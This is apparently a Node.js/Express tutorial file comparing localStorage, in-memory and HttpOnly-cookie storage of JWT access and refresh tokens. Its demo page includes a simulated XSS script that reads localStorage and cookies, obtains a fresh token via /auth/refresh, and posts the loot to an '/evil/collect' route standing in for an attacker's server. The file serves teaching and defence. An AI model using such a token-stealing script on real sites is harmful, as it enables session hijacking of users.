const express = require("express");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");
const { promisify } = require("util");

const scrypt = promisify(crypto.scrypt);
const SCRYPT_OPTIONS = { N: 2 ** 17, r: 8, p: 1, maxmem: 256 * 1024 * 1024 };

const PORT = Number(process.env.PORT) || 3000;
const BASE_URL = `http://localhost:${PORT}`;
const ACCESS_TTL_SECONDS = Number(process.env.ACCESS_TTL_SECONDS) || 15 * 60; // 15 minutes
const REFRESH_TTL_MS = 7 * 24 * 60 * 60 * 1000;                              // 7 days

// shortcut: a new random secret on every start (all tokens die on restart). A real app loads it from an env var / secret manager.
const ACCESS_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString("hex");

// The three ways to keep tokens in a browser. The client picks one at login so you can compare them side by side.
//   localStorage: both tokens in the JSON body, the page saves them in localStorage (readable by ANY script on the page)
//   memory:       access token in the body (kept in a JS variable), refresh token in an HttpOnly cookie
//   cookie:       both tokens in HttpOnly cookies, no token ever reaches JavaScript
const STORAGE_MODES = ["localStorage", "memory", "cookie"];

// HttpOnly = invisible to document.cookie. SameSite=Strict = not sent on requests started by other sites (CSRF).
// In production: secure: true and the "__Host-" prefix for the access cookie (topic 10).
const COOKIE_BASE = { httpOnly: true, sameSite: "strict", secure: process.env.NODE_ENV === "production" };
const ACCESS_COOKIE_OPTIONS = { ...COOKIE_BASE, path: "/" };
const REFRESH_COOKIE_OPTIONS = { ...COOKIE_BASE, path: "/auth" }; // only sent to /auth/*

// ---------- "Database" ----------
// shortcut: in-memory Maps, lost on restart. A real app uses database tables.
const users = new Map();         // email -> { id, email, passwordHash }
const refreshTokens = new Map(); // sha256(refreshToken) -> { userId, storage, expiresAt }

async function hashPassword(password) {
  const salt = crypto.randomBytes(16);
  const hash = await scrypt(password, salt, 64, SCRYPT_OPTIONS);
  return `${salt.toString("hex")}:${hash.toString("hex")}`;
}

async function verifyPassword(password, stored) {
  const [saltHex, hashHex] = stored.split(":");
  const attempt = await scrypt(password, Buffer.from(saltHex, "hex"), 64, SCRYPT_OPTIONS);
  return crypto.timingSafeEqual(attempt, Buffer.from(hashHex, "hex"));
}
const DUMMY_HASH_PROMISE = hashPassword("dummy-password-never-used");

const sha256 = (value) => crypto.createHash("sha256").update(value).digest("hex");
const findUserById = (id) => [...users.values()].find((u) => u.id === id);
const signAccessToken = (user) => jwt.sign({ sub: user.id, email: user.email }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: ACCESS_TTL_SECONDS });

function readCookie(req, name) {
  for (const part of (req.headers.cookie ?? "").split(";")) {
    const [key, ...rest] = part.trim().split("=");
    if (key === name) return rest.join("=");
  }
  return undefined;
}

// Step 1: hand out tokens the way the chosen storage needs them
function sendTokens(res, user, storage, refreshToken) {
  const accessToken = signAccessToken(user);
  if (storage === "localStorage") return res.json({ storage, accessToken, refreshToken, expiresIn: ACCESS_TTL_SECONDS });
  res.cookie("refreshToken", refreshToken, { ...REFRESH_COOKIE_OPTIONS, maxAge: REFRESH_TTL_MS });
  if (storage === "memory") return res.json({ storage, accessToken, expiresIn: ACCESS_TTL_SECONDS });
  res.cookie("accessToken", accessToken, { ...ACCESS_COOKIE_OPTIONS, maxAge: ACCESS_TTL_SECONDS * 1000 });
  res.json({ storage, expiresIn: ACCESS_TTL_SECONDS }); // no token in the body at all
}

function clearAuthCookies(res) {
  res.clearCookie("accessToken", ACCESS_COOKIE_OPTIONS);
  res.clearCookie("refreshToken", REFRESH_COOKIE_OPTIONS);
}

// ---------- App ----------
const app = express();
app.use(express.json({ limit: "10kb" }));
app.use((req, res, next) => { res.set("Cache-Control", "no-store"); next(); });

// Step 3: CSRF defense. Cookies are sent AUTOMATICALLY, so once a token lives in a cookie, other sites
// could make the browser send it. SameSite=Strict blocks that in modern browsers; this Origin check is the second lock.
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method) && origin && origin !== BASE_URL) {
    return res.status(403).json({ error: "Request from another site was blocked" });
  }
  next();
});

// Accept the access token from the Authorization header (localStorage / memory) OR the HttpOnly cookie (cookie mode)
function requireAuth(req, res, next) {
  const [scheme, headerToken] = (req.headers.authorization ?? "").split(" ");
  const token = scheme === "Bearer" && headerToken ? headerToken : readCookie(req, "accessToken");
  if (!token) return res.status(401).json({ error: "Not logged in" });
  try {
    req.auth = jwt.verify(token, ACCESS_SECRET, { algorithms: ["HS256"] });
    req.auth.via = token === headerToken ? "Authorization header" : "HttpOnly cookie";
    next();
  } catch (err) {
    res.status(401).json({ error: err.name === "TokenExpiredError" ? "Access token expired" : "Invalid access token" });
  }
}

app.post("/auth/signup", async (req, res) => {
  const { email, password } = req.body ?? {};
  if (typeof email !== "string" || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim()) || typeof password !== "string" || password.length < 8 || password.length > 128) {
    return res.status(400).json({ error: "A valid email and a password of 8-128 characters are required" });
  }
  const normalizedEmail = email.trim().toLowerCase();
  const passwordHash = await hashPassword(password);
  if (users.has(normalizedEmail)) return res.status(409).json({ error: "Email already registered" });
  const user = { id: crypto.randomUUID(), email: normalizedEmail, passwordHash };
  users.set(normalizedEmail, user);
  res.status(201).json({ id: user.id, email: user.email });
});

app.post("/auth/login", async (req, res) => {
  const { email, password, storage = "memory" } = req.body ?? {};
  if (typeof email !== "string" || typeof password !== "string" || !email || !password || !STORAGE_MODES.includes(storage)) {
    return res.status(400).json({ error: `Email, password and storage (${STORAGE_MODES.join(", ")}) are required` });
  }
  const user = users.get(email.trim().toLowerCase());
  const ok = await verifyPassword(password, user ? user.passwordHash : await DUMMY_HASH_PROMISE);
  if (!user || !ok) return res.status(401).json({ error: "Invalid email or password" });

  const refreshToken = crypto.randomBytes(32).toString("hex");
  refreshTokens.set(sha256(refreshToken), { userId: user.id, storage, expiresAt: Date.now() + REFRESH_TTL_MS });
  sendTokens(res, user, storage, refreshToken);
});

// REFRESH (topic 21): the refresh token comes from the HttpOnly cookie, or from the body (localStorage mode / mobile apps)
app.post("/auth/refresh", (req, res) => {
  const refreshToken = readCookie(req, "refreshToken") ?? req.body?.refreshToken;
  const stored = /^[a-f0-9]{64}$/.test(refreshToken ?? "") && refreshTokens.get(sha256(refreshToken));
  const user = stored && findUserById(stored.userId);
  if (!stored || Date.now() > stored.expiresAt || !user) {
    clearAuthCookies(res);
    return res.status(401).json({ error: "Please log in" });
  }
  // shortcut: same refresh token is sent back. Topic 23 rotates it.
  sendTokens(res, user, stored.storage, refreshToken);
});

app.post("/auth/logout", (req, res) => {
  const refreshToken = readCookie(req, "refreshToken") ?? req.body?.refreshToken;
  if (typeof refreshToken === "string") refreshTokens.delete(sha256(refreshToken));
  clearAuthCookies(res);
  res.json({ message: "Logged out" });
});

app.get("/me", requireAuth, (req, res) => {
  res.json({ email: req.auth.email, tokenCameFrom: req.auth.via });
});

// A state-changing action, to show CSRF matters once the token is in a cookie
app.post("/transfer", requireAuth, (req, res) => {
  const amount = Number(req.body?.amount);
  if (!Number.isInteger(amount) || amount <= 0 || amount > 100000) return res.status(400).json({ error: "amount must be a whole number of rupees, 1-100000" });
  console.log(`💸 ${req.auth.email} sent ₹${amount}`);
  res.json({ message: `Sent ₹${amount}` });
});

// ---------- Step 2: the "attacker's server" ----------
// shortcut: in real life this is evil.example, not a route on OUR server. It's here so the demo needs one process.
// It receives whatever the XSS script could read, then tries to use it FROM THE ATTACKER'S MACHINE.
app.post("/evil/collect", (req, res) => {
  const loot = req.body ?? {};
  const stolenAccess = loot.localStorage?.accessToken || loot.accessTokenFromRefresh;
  const stolenRefresh = loot.localStorage?.refreshToken;
  let accessTokenWorks = false;
  try { accessTokenWorks = !!(stolenAccess && jwt.verify(stolenAccess, ACCESS_SECRET, { algorithms: ["HS256"] })); } catch { /* not usable */ }
  const refreshTokenWorks = typeof stolenRefresh === "string" && refreshTokens.has(sha256(stolenRefresh));
  const report = {
    readFromLocalStorage: Object.keys(loot.localStorage ?? {}),
    readFromDocumentCookie: loot.documentCookie || "(nothing: HttpOnly cookies are invisible)",
    gotAccessTokenBy: loot.localStorage?.accessToken ? "reading localStorage" : loot.accessTokenFromRefresh ? "calling /auth/refresh from the page" : "(no token)",
    accessTokenWorksOnAttackersMachine: accessTokenWorks, // works until it expires (15 min)
    refreshTokenWorksOnAttackersMachine: refreshTokenWorks, // works for 7 days: the real prize
    couldCallTheApiFromInsideThePage: loot.couldCallApiFromPage === true,
  };
  console.log("\n🕵️  Attacker received:", report, "\n");
  res.json(report);
});

// ---------- The demo page (the frontend side of each storage mode) ----------
const DEMO_PAGE = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>25. Token storage demo</title>
<style>
  body { font: 15px/1.5 system-ui, sans-serif; max-width: 780px; margin: 24px auto; padding: 0 16px; }
  input, button { font: inherit; padding: 6px 10px; margin: 2px; }
  fieldset { margin: 8px 0; }
  #log { background: #111; color: #ddd; padding: 12px; border-radius: 8px; min-height: 200px; white-space: pre-wrap; font: 13px/1.5 ui-monospace, monospace; }
</style></head><body>
<h1>Where should the token live?</h1>
<fieldset><legend>Storage</legend>
  <label><input type="radio" name="storage" value="localStorage"> localStorage (both tokens)</label><br>
  <label><input type="radio" name="storage" value="memory" checked> Memory + HttpOnly refresh cookie</label><br>
  <label><input type="radio" name="storage" value="cookie"> HttpOnly cookies only</label>
</fieldset>
<input id="email" value="rahul@mail.com" aria-label="Email"> <input id="password" type="password" value="correct horse battery" aria-label="Password"><br>
<button id="signup">Sign up</button> <button id="login">Log in</button> <button id="me">Call /me</button>
<button id="reload">Reload page</button> <button id="xss">Run the attacker's XSS script</button> <button id="logout">Log out</button>
<p id="status">Not logged in</p>
<div id="log" role="log" aria-live="polite"></div>
<script>
const $ = (id) => document.getElementById(id);
const log = (msg) => { $("log").textContent = new Date().toLocaleTimeString() + "  " + msg + "\\n" + $("log").textContent; };
let memoryToken = null; // memory mode: lives only in this variable (in a real app: inside a module, not on window)

function authHeaders() {
  const token = localStorage.getItem("accessToken") || memoryToken;
  return token ? { Authorization: "Bearer " + token } : {}; // cookie mode: nothing to add, the browser sends the cookie
}

function keepTokens(body) {
  if (body.storage === "localStorage") { localStorage.setItem("accessToken", body.accessToken); localStorage.setItem("refreshToken", body.refreshToken); }
  if (body.storage === "memory") memoryToken = body.accessToken;
  $("status").textContent = "Logged in, tokens kept in: " + body.storage;
}

async function post(path, data) {
  const res = await fetch(path, { method: "POST", headers: { "Content-Type": "application/json", ...authHeaders() }, body: JSON.stringify(data || {}) });
  return { res, body: await res.json() };
}

$("signup").onclick = async () => { const { res, body } = await post("/auth/signup", { email: $("email").value, password: $("password").value }); log("signup → " + res.status + " " + JSON.stringify(body)); };
$("login").onclick = async () => {
  localStorage.clear(); memoryToken = null;
  const storage = document.querySelector("input[name=storage]:checked").value;
  const { res, body } = await post("/auth/login", { email: $("email").value, password: $("password").value, storage });
  log("login (" + storage + ") → " + res.status + " " + JSON.stringify(body).slice(0, 120));
  if (res.ok) keepTokens(body);
};
$("me").onclick = async () => { const res = await fetch("/me", { headers: authHeaders() }); log("/me → " + res.status + " " + JSON.stringify(await res.json())); };
$("reload").onclick = () => location.reload();
$("logout").onclick = async () => {
  const { body } = await post("/auth/logout", { refreshToken: localStorage.getItem("refreshToken") || undefined });
  localStorage.clear(); memoryToken = null; $("status").textContent = "Not logged in"; log("logout → " + JSON.stringify(body));
};

// THE ATTACK. Any script that runs on this page (an XSS hole, a hacked npm package, a bad browser extension)
// can do exactly this. Clicking the button runs the same code an injected <script> would run.
$("xss").onclick = async () => {
  log("😈 attacker script runs on the page…");
  const loot = { localStorage: { ...localStorage }, documentCookie: document.cookie };
  // Can't read the HttpOnly cookie? Just ASK for a new access token: the browser attaches the refresh cookie by itself.
  const refreshed = await fetch("/auth/refresh", { method: "POST" });
  if (refreshed.ok) loot.accessTokenFromRefresh = (await refreshed.json()).accessToken;
  // Even without stealing anything, the script can act AS the user while the page is open:
  const token = loot.localStorage.accessToken || loot.accessTokenFromRefresh;
  const me = await fetch("/me", { headers: token ? { Authorization: "Bearer " + token } : {} });
  loot.couldCallApiFromPage = me.ok;
  const report = await (await fetch("/evil/collect", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(loot) })).json();
  log("🕵️ attacker got: " + JSON.stringify(report, null, 2));
};

// PAGE LOAD: localStorage survives on its own. Memory mode and cookie mode come back via the HttpOnly refresh cookie (topic 22).
(async function restore() {
  if (localStorage.getItem("accessToken")) { $("status").textContent = "Logged in, tokens kept in: localStorage"; return log("page load: token found in localStorage"); }
  const res = await fetch("/auth/refresh", { method: "POST" });
  if (!res.ok) return log("page load: not logged in");
  const body = await res.json();
  keepTokens(body);
  log("page load: restored via the HttpOnly refresh cookie (" + body.storage + " mode)");
})();
</script></body></html>`;

app.get("/", (req, res) => res.type("html").send(DEMO_PAGE));

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// Errors (bad JSON, body too big, bugs) come here. Never send the stack trace to the client.
app.use((err, req, res, next) => {
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Body must be valid JSON" });
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Request body too large" });
  console.error(err);
  res.status(500).json({ error: "Something went wrong" });
});

app.listen(PORT, () => console.log(`Token storage demo on ${BASE_URL}. Open it in your browser.`));

setInterval(() => {
  const now = Date.now();
  for (const [key, t] of refreshTokens) if (now > t.expiresAt) refreshTokens.delete(key);
}, 60_000).unref();
